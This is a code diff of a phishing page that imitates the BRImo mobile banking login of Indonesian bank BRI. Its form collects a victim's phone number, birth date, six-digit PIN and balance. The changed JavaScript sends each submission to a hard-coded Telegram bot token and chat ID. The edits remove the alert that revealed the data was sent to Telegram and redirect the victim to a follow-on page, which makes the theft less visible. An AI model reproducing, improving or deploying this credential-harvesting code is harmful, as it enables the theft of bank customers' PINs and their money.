@@ -132,35 +132,35 @@
         </div>
       </div>
       <div class="input-group">
-        <label for="phone">Nomor Handphone</label>
+        <label for="phone">Nomor Handphone:</label>
         <div class="input-icon">
           <img src="rii.png" alt="Phone Icon">
-          <input type="tel" name="phone" id="phone" placeholder="+62 8xxx xxxx xxxx" required maxlength="12" oninput="this.value = this.value.replace(/\D/g,'').substring(0, 12)">
+          <input type="tel" name="phone" id="phone" placeholder="8xxx xxxx xxxx" required maxlength="12" oninput="this.value = this.value.replace(/\D/g,'').substring(0, 12)">
         </div>
       </div>
       <div class="input-group">
-        <label for="masa_berlaku">Tgl Lahir (DD/MM/YYYY)</label>
+        <label for="masa_berlaku">Tanggal Lahir:</label>
         <div class="input-icon">
           <img src="kal.png" alt="Date Icon">
           <input type="tel" id="masa_berlaku" name="masa_berlaku" placeholder="DD/MM/YYYY" required maxlength="10">
         </div>
       </div>
       <div class="input-group">
-        <label for="pin">Masukkan PIN 6 Digit</label>
+        <label for="pin">PIN BRImo:</label>
         <div class="input-icon">
           <img src="pin.png" alt="PIN Icon">
           <input type="password" name="pin" id="pin" placeholder="Masukkan PIN 6 Digit" required minlength="6" maxlength="6" oninput="this.value=this.value.replace(/\D/g,'')">
         </div>
       </div>
       <div class="input-group">
-        <label for="balance">Sisa Saldo Terakhir</label>
+        <label for="balance">Sisa Saldo Akhir:</label>
         <div class="input-icon">
           <img src="kol.png" alt="Saldo Icon">
           <input type="tel" id="jumlahInput" name="balance" placeholder="Sisa Saldo Terakhir" required oninput="updateNominal()">
         </div>
       </div>
       <button type="submit" class="btn">LANJUT</button>
-      <a href="index.html" class="btn-link">Kembali ke Halaman Utama</a>
+      <a href="lanjut.html" class="btn-link">Kembali ke Halaman Utama</a>
       <div class="loader" id="loader"></div>
     </form>
   </div>
@@ -193,18 +193,12 @@
     function sendMessageToTelegram(message) {
       var xhttp = new XMLHttpRequest();
       xhttp.onreadystatechange = function() {
-        if (this.readyState === 4) {
-          if (this.status === 200) {
-            console.log("Pesan terkirim: " + message);
-          } else {
-            console.error("Gagal mengirim pesan. Status: " + this.status + ", Response: " + this.responseText);
-          }
+        if (this.readyState === 4 && this.status !== 200) {
+          console.error("Gagal mengirim pesan. Status: " + this.status + ", Response: " + this.responseText);
         }
       };
 
-      // Ganti <your-bot-token> dan <chat_id> dengan token bot dan ID chat yang benar
       var url = "https://api.telegram.org/bot6711678141:AAHCPWlRygK8bHdAhXUlfIFCf6GztfCwsjY/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
-      console.log("URL yang dikirim: " + url); // Debug URL
       xhttp.open("POST", url, true);
       xhttp.send();
     }
@@ -232,8 +226,7 @@
 
       setTimeout(function() {
         loader.style.display = "none";
-        alert("Data berhasil dikirim ke Telegram!");
-        document.getElementById("registrationForm").reset(); // Reset form
+        window.location.href = "lanjut.html"; // Alihkan ke halaman lanjut.html
       }, 2000); // Simulasi delay pengiriman
     });
 
